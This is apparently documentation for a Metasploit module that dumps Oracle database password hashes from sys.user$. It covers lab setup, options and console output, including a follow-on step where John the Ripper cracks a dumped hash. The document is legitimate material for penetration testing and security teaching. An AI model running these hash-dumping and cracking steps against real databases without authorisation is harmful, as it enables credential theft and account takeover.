## Preparation: 6 steps

  1. Oracle DB XE (Express Edition) can be downloaded for free [here](https://www.oracle.com/technetwork/database/database-technologies/express-edition/downloads/index.html).
  2. Install Oracle Database and create a database. Versions 8i through 12c are supported.
  3. On your Oracle DB machine, make sure you can ping the DB server using the `tnsping [SID]` command. If `tnsping` is not in your path upon installation, you will have to locate it manually.
     * On a Windows machine, for Oracle 11g, `tnsping.exe` is located at: `oracle_install\app\oracle\product\<version, ie 11.2.0)\server\bin\tnsping.exe`.
     * On a Windows machine, for Oracle 12c and 18c, it is located at `%ORACLE_HOME%\bin\tnsping.exe`.

     After this command is run, if all is well, the output will look something like this (note the OK echoed at the end):

    ```
    C:> tnsping staticdb
    ...
    
    Used TNSNAMES adapter to resolve the alias
    Attempting to contact (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = staticdb)))
    OK (0 msec)
    ```

    If `tnsping` fails, make sure the listener is setup correctly.
    See [this Oracle doc](https://docs.oracle.com/cd/E11882_01/network.112/e41945/listenercfg.htm#NETAG294) for more information about its configuration. 

  4. Make sure to create a user on the DB that has a known password, and sufficient privileges to select any table. This is necessary for getting the hashes.
  5. Test that the module's hash query works locally. Once your user is created with sufficient privileges, connect to the DB as the user, and proceed to run the following query
    * 12c: `SELECT name, spare4 FROM sys.user$ where password is not null and name <> \'ANONYMOUS\'`
    * pre-12c: `SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\'`
  6. Set up your MSF environment to support Oracle. You need gem ruby-oci8, as well as Oracle Instant Client.
     [View the setup tutorial here](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux)
  7. Make sure you have a database connected to MSF (postgresql). This can be done through `msfdb` tool or through `db_connect` command in `msfconsole`.

## Verification Steps

  1. Start `msfconsole`
  2. Do: ```use auxiliary/scanner/oracle/oracle_hashdump.rb```
  3. Do: ```run```
  4. If Oracle DB version is supported, the query will be attempted to get the hashes. Hash table is built and then saved as credentials.
  5. You may view saved credentials with `creds` command. These are used for cracking by module `jtr_oracle_fast`.

## Options

  **DBPASS**
  The password to authenticate with. Change this from TIGER to the password of the privileged user created in step 4 of Preparation.

  **DBUSER**
  The username to authenticate with. Change this from SCOTT to the user you created who is granted privileges to select from the sys.user$ table

  **RPORT**
  The TNS port of the Oracle DB server. By default, Oracle uses port 1521. Double-check the port of your Oracle DB.

  **SID**
  The Service ID (of the database) to authenticate with. Change this to your SID (if you changed the SID from default upon installation).
  Default is `ORCL` (default Oracle install value) or `XE` for free edition.

## Scenarios

### Running Oracle 12c on a local Windows 10 machine, and MSF5 on Ubuntu for Windows (same machine)

```
msf5 auxiliary(scanner/oracle/oracle_hashdump) > show options
Module options (auxiliary/scanner/oracle/oracle_hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DBPASS   hunter2          yes       The password to authenticate with.
   DBUSER   scott            yes       The username to authenticate with.
   RHOST    127.0.0.1        yes       The Oracle host.
   RHOSTS   127.0.0.1        yes       The target address range or CIDR identifier
   RPORT    1522             yes       The TNS port.
   SID      staticdb         yes       The sid to authenticate with.
   THREADS  1                yes       The number of concurrent threads

msf5 auxiliary(scanner/oracle/oracle_hashdump) > run

[*] Server is running 12c
[*] Hash table :
 Oracle Server Hashes
====================

 Username               Hash
 --------               ----
 ...
 SCOTT                  S:BF6D4E3791075A348BA76EF533E38F7211513CCE2A3513EE3E3D4A5A4DE0;H:3814C74599475EB73043A1211742EE59;T:0911BAC55EEF63F0C1769E816355BE29492C9D01980DC36C95A86C9CE47F93790631DE3D9A60C90451CFF152E25D9E94F612A1493EC82AF8E3C4D0432B06BA4C2C693B932332BC14D2D66CEF098A4699
 ...
 
[+] Hash Table has been saved
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/oracle/oracle_hashdump) > creds
Credentials
===========

host       origin     service            public  private                                                                                                                                                                                                                                                               realm  private_type        JtR Format
----       ------     -------            ------  -------      
...                                                                                                                                                                                                                                                         -----  ------------        ----------
127.0.0.1  127.0.0.1  1522/tcp (oracle)  SCOTT   S:BF6D4E3791075A348BA76EF533E38F7211513CCE2A3513EE3E3D4A5A4DE0;H:3814C74599475EB73043A1211742EE59;T:0911BAC55EEF63F0C1769E816355BE29492C9D01980DC36C95A86C9CE47F93790631DE3D9A60C90451CFF152E25D9E94F612A1493EC82AF8E3C4D0432B06BA4C2C693B932332BC14D2D66CEF098A4699         Nonreplayable hash  oracle12c
```

These hashes are then saved as credentials so that `jtr_oracle_fast` can crack them (using [John The Ripper "bleeding_jumbo"](https://github.com/magnumripper/JohnTheRipper)).

```
msf5 auxiliary(scanner/oracle/oracle_hashdump) > use auxiliary/analyze/jtr_oracle_fast
msf5 auxiliary(analyze/jtr_oracle_fast) > run
...
[*] Cracking oracle12c hashes in normal wordlist mode...
Using default input encoding: UTF-8
[*] Cracking oracle12c hashes in single mode...
Using default input encoding: UTF-8
[*] Cracked passwords this run:
[+] SCOTT:hunter2
...
```
### Oracle 18c (18.4 XE) on Windows 2012

```
resource (oracle.rb)> use auxiliary/scanner/oracle/oracle_hashdump
resource (oracle.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (oracle.rb)> set dbuser system
dbuser => system
resource (oracle.rb)> set dbpass oracle
dbpass => oracle
resource (oracle.rb)> set sid XE
sid => XE
resource (oracle.rb)> run
[-] Version 18c is not currently supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Oracle 11g (11.2 XE) on Windows 2012

```
resource (oracle.rb)> use auxiliary/scanner/oracle/oracle_hashdump
resource (oracle.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (oracle.rb)> set dbuser system
dbuser => system
resource (oracle.rb)> set dbpass oracle
dbpass => oracle
resource (oracle.rb)> set sid XE
sid => XE
msf5 auxiliary(scanner/oracle/oracle_hashdump) > set verbose true
verbose => true
msf5 auxiliary(scanner/oracle/oracle_hashdump) > run

[*] Server is running version 11g
[*] Hash table :
 Oracle Server Hashes
====================

 Username          Hash
 --------          ----
 APEX_040000       S:03D9B47D20C9A9EC3023177D80C0EE2D1DCEDA619215C2405177CEFFEE76
 APEX_PUBLIC_USER  S:E8D8CCD600CBCEA08ACB158A502C5DA711B00146404621BB2F83E8997246
 APPQOSSYS         S:4237CCB702887B049107EE6D13C312123F40E3F51208B2B70D6DA92E621D
 CTXSYS            S:3548FDA49F84F2F7ECE4635BA0FD714EC2446723074ED6167F1CD9B6EDFB
 DBSNMP            S:59354E99120C523F77232A8CCFDE5E780591FCE14109EEE2C86F4A9B4E8F
 DIP               S:1E4C37D0E8DC2E556D3C02A961ACEF1500B315D076BE13E578D1A28FC757
 FLOWS_FILES       S:A3657555975A9F7527C4B97637734D74465C592B9D231CA3DAB100ED5865
 HR                S:F437C1647EBCEB1D1FB4BB3D866953B4BF612B343944B899E061B361F31B
 MDSYS             S:F337C5D6300E3F8CDEDE0F2B2336415EAAE098A700A35E6731BF1370657E
 ORACLE_OCM        S:1575D1C89A1AACFE161ED788D2DC59CF6C57AE3B6CCC341D831AAF5BC447
 OUTLN             S:142AD444D8A63983FF69C77DBFD3E60947C14237AEC71031E24F5228D44C
 SYS               S:BFAF1ED5A8D39CC10D07DAF03A175C65198359874DAD92F081BE09B89162
 SYSTEM            S:D88BA08B353EC52E1EFD8433DF623773ACE3F81B7294BBC2E5C22CDD32F5
 XDB               S:88D6BE2B593143BD5AE5185C564826F9213E71361230D3360E36C3FF55D2
 XS$NULL           S:6C4F97FF654AE30BCD9BDBB3007EF952B5943F0A9ED491455E9FB185D8A1

[+] Hash Table has been saved
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
